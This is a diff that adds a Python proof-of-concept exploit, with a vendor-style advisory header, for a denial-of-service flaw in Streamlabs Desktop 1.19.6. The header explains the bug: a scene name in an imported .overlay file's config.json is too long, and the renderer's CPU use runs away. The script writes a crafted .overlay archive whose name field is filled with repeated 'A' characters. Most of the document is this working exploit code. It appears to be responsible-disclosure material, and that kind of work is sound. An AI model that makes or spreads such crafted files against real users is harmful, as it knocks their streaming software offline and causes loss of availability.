@@ -1,0 +1,114 @@
+#!/usr/bin/env python3
+#
+#
+# Logitech Streamlabs Desktop 1.19.6 (overlay) CPU Exhaustion
+#
+#
+# Vendor: Logitech | General Workings, Inc.
+# Product web page: https://www.logitech.com | https://www.streamlabs.com
+# Affected version 1.19.6 (macOS/Win)
+#
+# Summary: Streamlabs Desktop is a free streaming and recording software,
+# built on OBS Studio, for content creators to stream live to platforms
+# like Twitch, YouTube, and Facebook. It is designed to be beginner-friendly
+# and offers tools for creating engaging streams, such as customizable overlays,
+# alerts for viewer interactions, and the ability to add guests to a stream. 
+#
+# Desc: A vulnerability exists in Streamlabs Desktop where importing a
+# crafted .overlay file can cause uncontrolled CPU consumption, leading
+# to a denial-of-service condition. The .overlay file is an archive
+# containing a config.json configuration. By inserting an excessively
+# large string into the name attribute of a scene object within config.json,
+# the application's renderer process (Frameworks/Streamlabs Desktop Helper
+# (Renderer).app) spikes to over 150% CPU and becomes unresponsive. This
+# forces the victim to terminate the application manually, resulting in
+# loss of availability. An attacker could exploit this by distributing
+# malicious overlay files to disrupt streaming operations.
+#
+# ----------------------------------------------------------------------
+# $ ps ucp 66595
+# USER     PID  %CPU %MEM      VSZ    RSS   TT  STAT STARTED      TIME COMMAND
+# lqwrm 66595 100.3  0.6 1596218784 221344   ??  R     2:15PM   1:32.11 Streamlabs Desktop Helper (Renderer)
+# ----------------------------------------------------------------------
+#
+# Tested on: macOS Sequoia version 15.7.2, 15.7.1
+#            Microsoft Windows 11 25H2
+#            Microsfot Windows 10
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2025-5967
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5967.php
+#
+#
+# 15.10.2025
+#
+
+
+import argparse
+import json
+import zipfile
+from pathlib import Path
+
+def build_config(name: str) -> dict:
+    return {
+        "schemaVersion": 2,
+        "nodeType": "RootNode",
+        "scenes": {
+            "schemaVersion": 2,
+            "nodeType": "ScenesNode",
+            "items": [
+                {
+                    "slots": {
+                        "schemaVersion": 1,
+                        "nodeType": "SlotsNode",
+                        "items": []
+                    },
+                    "name": name,
+                    "sceneId": "scene_8e59eea4-d0f1-424f-8837-1aacd707700c"
+                }
+            ]
+        },
+        "transition": {
+            "schemaVersion": 1,
+            "nodeType": "TransitionNode",
+            "type": "cut_transition",
+            "settings": {},
+            "duration": 300
+        },
+        "nodeMap": {
+            "schemaVersion": 1,
+            "nodeType": "NodeMapNode"
+        }
+    }
+
+def create_overlay(output_path: Path, name_length: int = 1000) -> Path:
+    scene_name = "A" * name_length
+    config_dict = build_config(scene_name)
+    config_bytes = json.dumps(config_dict, indent=2, ensure_ascii=False).encode("utf-8")
+
+    output_path.parent.mkdir(parents=True, exist_ok=True)
+
+    with zipfile.ZipFile(output_path, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr("config.json", config_bytes)
+
+    return output_path
+
+def main():
+    parser = argparse.ArgumentParser(description="Create a Streamlabs .overlay with a 1000 chars scene name.")
+    parser.add_argument("-o", "--output", type=Path, default=Path("sample.overlay"),
+                        help="Path to the output .overlay archive (default: sample.overlay)")
+    parser.add_argument("-n", "--name-length", type=int, default=1000,
+                        help="Number of bytes to use for the scene name (default: 1000)")
+
+    args = parser.parse_args()
+
+    out = create_overlay(args.output, name_length=args.name_length)
+    print(f"Created overlay: {out.resolve()}")
+
+
+if __name__ == "__main__":
+    main()
